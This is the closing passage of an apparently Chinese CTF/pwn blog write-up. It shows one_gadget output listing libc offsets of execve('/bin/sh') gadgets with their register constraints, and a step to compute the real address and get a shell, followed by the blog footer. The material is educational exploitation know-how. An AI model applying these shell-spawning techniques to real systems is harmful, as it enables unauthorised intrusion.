+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@wxm-virtual-machine:~/pwn/i春秋/<span class="number">0x03</span># one_gadget libc.so.6_x64 </span><br><span class="line"><span class="number">0x45526</span>	execve(<span class="string">"/bin/sh"</span>, <span class="built_in">rsp</span>+<span class="number">0x30</span>, environ)</span><br><span class="line"><span class="symbol">constraints:</span></span><br><span class="line">  <span class="built_in">rax</span> == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0x4557a</span>	execve(<span class="string">"/bin/sh"</span>, <span class="built_in">rsp</span>+<span class="number">0x30</span>, environ)</span><br><span class="line"><span class="symbol">constraints:</span></span><br><span class="line">  [<span class="built_in">rsp</span>+<span class="number">0x30</span>] == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0xf1651</span>	execve(<span class="string">"/bin/sh"</span>, <span class="built_in">rsp</span>+<span class="number">0x40</span>, environ)</span><br><span class="line"><span class="symbol">constraints:</span></span><br><span class="line">  [<span class="built_in">rsp</span>+<span class="number">0x40</span>] == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0xf24cb</span>	execve(<span class="string">"/bin/sh"</span>, <span class="built_in">rsp</span>+<span class="number">0x60</span>, environ)</span><br><span class="line"><span class="symbol">constraints:</span></span><br><span class="line">  [<span class="built_in">rsp</span>+<span class="number">0x60</span>] == NULL</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后计算出execve在内存中的真实地址，然后进行getshell</li>
+</ul>
+<p><em><a href="https://xz.aliyun.com/t/2720" target="_blank" rel="noopener">one_gadget的工作原理</a></em></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
